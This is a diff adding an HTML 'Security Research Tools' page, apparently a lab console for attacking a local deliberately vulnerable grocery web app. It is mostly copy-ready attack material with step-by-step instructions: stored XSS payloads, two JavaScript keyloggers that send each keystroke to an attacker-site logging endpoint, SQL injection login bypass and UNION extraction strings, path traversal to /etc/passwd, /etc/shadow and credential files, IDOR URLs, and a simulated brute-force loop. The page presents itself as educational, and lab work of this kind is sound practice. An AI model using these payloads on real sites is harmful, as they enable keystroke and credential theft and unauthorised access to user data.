@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Research Tools</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        header {
+            background-color: #35424a;
+            color: white;
+            padding: 1rem;
+            text-align: center;
+        }
+        nav {
+            background-color: #2c3e50;
+            padding: 0.5rem;
+        }
+        nav a {
+            color: white;
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            margin: 0 0.5rem;
+        }
+        nav a:hover {
+            background-color: #3498db;
+        }
+        main {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+        .attack-section {
+            background: white;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            color: #2c3e50;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 0.5rem;
+        }
+        pre {
+            background-color: #f8f9fa;
+            padding: 1rem;
+            border-radius: 4px;
+            overflow-x: auto;
+            border: 1px solid #ddd;
+        }
+        .button {
+            display: inline-block;
+            background-color: #3498db;
+            color: white;
+            padding: 0.5rem 1rem;
+            text-decoration: none;
+            border-radius: 4px;
+            margin-top: 1rem;
+        }
+        .button:hover {
+            background-color: #2980b9;
+        }
+        footer {
+            text-align: center;
+            padding: 1rem;
+            background-color: #35424a;
+            color: white;
+            margin-top: 2rem;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+        }
+        .form-group input, .form-group textarea {
+            width: 100%;
+            padding: 0.5rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .form-group textarea {
+            height: 100px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Security Research Tools</h1>
+    </header>
+    
+    <nav>
+        <a href="#xss">XSS Attack</a>
+        <a href="#sql">SQL Injection</a>
+        <a href="#lfi">LFI Attack</a>
+        <a href="#brute">Brute Force</a>
+        <a href="#idor">IDOR Attack</a>
+    </nav>
+    
+    <main>
+        <section class="attack-section" id="xss">
+            <h2>Persistent XSS Attack</h2>
+            <p>This tool demonstrates a persistent Cross-Site Scripting (XSS) attack against the Fresh Groceries blog.</p>
+            
+            <div class="form-group">
+                <label for="xss-payload">XSS Payload:</label>
+                <textarea id="xss-payload"><script>alert('XSS Attack Successful!');</script></textarea>
+            </div>
+            
+            <div class="form-group">
+                <label for="xss-title">Blog Post Title:</label>
+                <input type="text" id="xss-title" value="Delicious Recipe">
+            </div>
+            
+            <button class="button" onclick="copyXssPayload()">Copy Payload</button>
+            
+            <div style="margin-top: 1rem;">
+                <h3>Instructions:</h3>
+                <ol>
+                    <li>Copy the simple XSS payload above (just the alert script)</li>
+                    <li>Go to the Fresh Groceries blog page (blog_new.php)</li>
+                    <li>Create a new post with any title</li>
+                    <li>Paste the payload in the content field</li>
+                    <li>Submit the post</li>
+                    <li>When any user views the blog, they will see an alert showing the XSS attack worked</li>
+                </ol>
+                
+                <h3>For the Keylogger Demo:</h3>
+                <ol>
+                    <li>After testing the simple alert payload, try one of the keylogger payloads from the Advanced Payloads section</li>
+                    <li>Create a new blog post with the keylogger payload</li>
+                    <li>When users view the blog post, their keystrokes will be captured</li>
+                    <li>The captured keystrokes will be stored in the keystrokes.log file</li>
+                </ol>
+                
+                <h3>How the Keylogger Works:</h3>
+                <p>The keylogger uses JavaScript's event listeners to capture keystrokes. It sends each keystroke to the attacker's server using an image request (which bypasses CORS restrictions).</p>
+                
+                <p>This allows an attacker to capture sensitive information like:</p>
+                <ul>
+                    <li>Passwords and usernames</li>
+                    <li>Credit card numbers</li>
+                    <li>Private messages</li>
+                    <li>Search queries</li>
+                </ul>
+            </div>
+            
+            <h3>Advanced Payloads:</h3>
+            <pre>
+// Simple Keylogger (Recommended for this exercise)
+&lt;script&gt;
+document.addEventListener('keypress', function(e) {
+  // Create an image element to send the data (avoids CORS issues)
+  var img = new Image();
+  img.src = 'http://localhost/WebAppTest/attacker_site/log.php?key=' + e.key;
+});
+alert('XSS Attack Successful! Keylogger activated.');
+&lt;/script&gt;
+
+// Enhanced Keylogger with Page Information
+&lt;script&gt;
+document.addEventListener('keypress', function(e) {
+  // Send each keystroke with context information
+  var img = new Image();
+  img.src = 'http://localhost/WebAppTest/attacker_site/log.php?key=' + e.key +
+    '&page=' + encodeURIComponent(window.location.href);
+  
+  // Show what was captured in the console (for demonstration)
+  console.log('Captured: ' + e.key + ' on page: ' + window.location.href);
+});
+alert('XSS Attack Successful! Enhanced keylogger activated.');
+&lt;/script&gt;
+            </pre>
+        </section>
+        
+        <section class="attack-section" id="sql">
+            <h2>SQL Injection Attack</h2>
+            <p>This tool demonstrates SQL injection attacks against the Fresh Groceries login page.</p>
+            
+            <div class="form-group">
+                <label for="sql-payload">SQL Injection Payload:</label>
+                <input type="text" id="sql-payload" value="' OR '1'='1">
+            </div>
+            
+            <button class="button" onclick="copySqlPayload()">Copy Payload</button>
+            
+            <div style="margin-top: 1rem;">
+                <h3>Instructions:</h3>
+                <ol>
+                    <li>Copy the SQL injection payload above</li>
+                    <li>Go to the Fresh Groceries login page</li>
+                    <li>Enter any username (e.g., "admin")</li>
+                    <li>Paste the payload in the password field</li>
+                    <li>Submit the form to bypass authentication</li>
+                </ol>
+            </div>
+            
+            <h3>Advanced Payloads:</h3>
+            <pre>
+// Basic authentication bypass
+' OR '1'='1
+' OR '1'='1' --
+' OR 1=1 --
+admin' --
+
+// Union-based data extraction
+' UNION SELECT username, password FROM users --
+            </pre>
+        </section>
+        
+        <section class="attack-section" id="lfi">
+            <h2>Local File Inclusion (LFI) Attack</h2>
+            <p>This tool demonstrates Local File Inclusion attacks against the Fresh Groceries file viewer.</p>
+            
+            <div class="form-group">
+                <label for="lfi-payload">LFI Payload:</label>
+                <input type="text" id="lfi-payload" value="../../../etc/passwd">
+            </div>
+            
+            <button class="button" onclick="copyLfiPayload()">Copy Payload</button>
+            
+            <div style="margin-top: 1rem;">
+                <h3>Instructions:</h3>
+                <ol>
+                    <li>Copy the LFI payload above</li>
+                    <li>Go to the Fresh Groceries file viewer page</li>
+                    <li>Append the payload to the URL: <code>view_file.php?file=[PAYLOAD]</code></li>
+                    <li>The server will include the specified file, allowing you to read sensitive files</li>
+                </ol>
+            </div>
+            
+            <h3>Common Target Files:</h3>
+            <pre>
+// System files
+../../../etc/passwd
+../../../etc/shadow
+../../../proc/self/environ
+
+// Web server configuration
+../../../etc/apache2/apache2.conf
+../../../etc/nginx/nginx.conf
+
+// Application files
+../../../var/www/html/config.php
+../../../var/www/html/credentials.php
+            </pre>
+        </section>
+        
+        <section class="attack-section" id="brute">
+            <h2>Brute Force Attack</h2>
+            <p>This tool demonstrates a brute force attack against the Fresh Groceries login page.</p>
+            
+            <div class="form-group">
+                <label for="brute-username">Target Username:</label>
+                <input type="text" id="brute-username" value="admin">
+            </div>
+            
+            <div class="form-group">
+                <label for="brute-wordlist">Password Wordlist:</label>
+                <textarea id="brute-wordlist">password
+123456
+admin123
+qwerty
+letmein
+password123
+admin
+welcome
+admin1
+123456789</textarea>
+            </div>
+            
+            <button class="button" id="start-brute">Start Brute Force Attack</button>
+            <button class="button" style="background-color: #e74c3c;" id="stop-brute">Stop Attack</button>
+            
+            <div id="brute-results" style="margin-top: 1rem; padding: 1rem; background-color: #f8f9fa; border-radius: 4px; display: none;">
+                <h3>Attack Results:</h3>
+                <div id="brute-output"></div>
+            </div>
+            
+            <div style="margin-top: 1rem;">
+                <h3>Instructions:</h3>
+                <ol>
+                    <li>Enter the target username</li>
+                    <li>Enter or modify the password wordlist</li>
+                    <li>Click "Start Brute Force Attack"</li>
+                    <li>The tool will attempt to login with each password</li>
+                    <li>Results will be displayed in the output area</li>
+                </ol>
+                <p><strong>Note:</strong> This is a simulated attack for educational purposes. In a real attack, you would use tools like Hydra or Burp Suite Intruder.</p>
+            </div>
+        </section>
+        
+        <section class="attack-section" id="idor">
+            <h2>Insecure Direct Object References (IDOR) Attack</h2>
+            <p>This tool demonstrates IDOR attacks against the Fresh Groceries user profiles.</p>
+            
+            <div class="form-group">
+                <label for="idor-id">User ID to Access:</label>
+                <input type="number" id="idor-id" value="1" min="1">
+            </div>
+            
+            <button class="button" onclick="generateIdorUrl()">Generate URL</button>
+            
+            <div id="idor-url" style="margin-top: 1rem; padding: 1rem; background-color: #f8f9fa; border-radius: 4px; display: none;">
+                <h3>IDOR Attack URL:</h3>
+                <code id="idor-url-output"></code>
+                <button class="button" style="margin-left: 1rem;" onclick="copyIdorUrl()">Copy URL</button>
+            </div>
+            
+            <div style="margin-top: 1rem;">
+                <h3>Instructions:</h3>
+                <ol>
+                    <li>Enter the user ID you want to access (e.g., 1 for admin)</li>
+                    <li>Click "Generate URL" to create the IDOR attack URL</li>
+                    <li>Copy the URL and paste it in your browser while logged in as any user</li>
+                    <li>You will be able to view and modify another user's profile</li>
+                </ol>
+            </div>
+            
+            <h3>Other Vulnerable Endpoints:</h3>
+            <pre>
+// View another user's orders
+orders.php?user_id=[ID]
+
+// View another user's payment information
+payment_info.php?user_id=[ID]
+
+// View another user's delivery addresses
+addresses.php?user_id=[ID]
+            </pre>
+        </section>
+    </main>
+    
+    <footer>
+        <p>This website is for educational purposes only. Do not use these techniques against systems without proper authorization.</p>
+        <p>&copy; 2024 Security Research Tools</p>
+    </footer>
+    
+    <script>
+        function copyXssPayload() {
+            const payload = document.getElementById('xss-payload').value;
+            navigator.clipboard.writeText(payload);
+            alert('XSS payload copied to clipboard!');
+        }
+        
+        function copySqlPayload() {
+            const payload = document.getElementById('sql-payload').value;
+            navigator.clipboard.writeText(payload);
+            alert('SQL injection payload copied to clipboard!');
+        }
+        
+        function copyLfiPayload() {
+            const payload = document.getElementById('lfi-payload').value;
+            navigator.clipboard.writeText(payload);
+            alert('LFI payload copied to clipboard!');
+        }
+        
+        function generateIdorUrl() {
+            const id = document.getElementById('idor-id').value;
+            const url = `http://localhost/WebAppTest/profile.php?id=${id}`;
+            document.getElementById('idor-url-output').textContent = url;
+            document.getElementById('idor-url').style.display = 'block';
+        }
+        
+        function copyIdorUrl() {
+            const url = document.getElementById('idor-url-output').textContent;
+            navigator.clipboard.writeText(url);
+            alert('IDOR URL copied to clipboard!');
+        }
+        
+        document.getElementById('start-brute').addEventListener('click', function() {
+            const username = document.getElementById('brute-username').value;
+            const wordlist = document.getElementById('brute-wordlist').value.split('\n');
+            const output = document.getElementById('brute-output');
+            
+            document.getElementById('brute-results').style.display = 'block';
+            output.innerHTML = '<p>Starting brute force attack...</p>';
+            
+            // Simulate brute force attack (this is just a simulation)
+            let i = 0;
+            const interval = setInterval(function() {
+                if (i < wordlist.length) {
+                    const password = wordlist[i].trim();
+                    output.innerHTML += `<p>Trying: ${username} / ${password} ... Failed</p>`;
+                    output.scrollTop = output.scrollHeight;
+                    i++;
+                } else {
+                    clearInterval(interval);
+                    output.innerHTML += '<p><strong>Attack completed. No successful login found.</strong></p>';
+                }
+            }, 500);
+            
+            document.getElementById('stop-brute').addEventListener('click', function() {
+                clearInterval(interval);
+                output.innerHTML += '<p><strong>Attack stopped by user.</strong></p>';
+            });
+        });
+    </script>
+</body>
+</html>
